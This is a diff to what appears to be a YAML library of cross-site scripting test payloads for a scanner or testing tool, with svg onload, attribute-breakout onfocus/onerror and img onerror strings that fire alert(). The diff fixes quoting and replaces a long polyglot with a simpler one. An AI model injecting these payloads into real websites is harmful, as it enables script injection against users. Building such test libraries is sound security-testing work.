@@ -180,11 +180,11 @@ payload_library:
     - "<svg onload=alert('XSS')>"
     
   polyglots:
-    - "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>")
+    - "javascript:alert(1)"  # Fixed polyglot
     
   attribute_context:
     - '" onfocus=alert(1) autofocus "'
-    - "' onerror=alert(1) '
+    - "' onerror=alert(1) '"
     - "><img src=x onerror=alert('XSS')>"
     
   javascript_context:
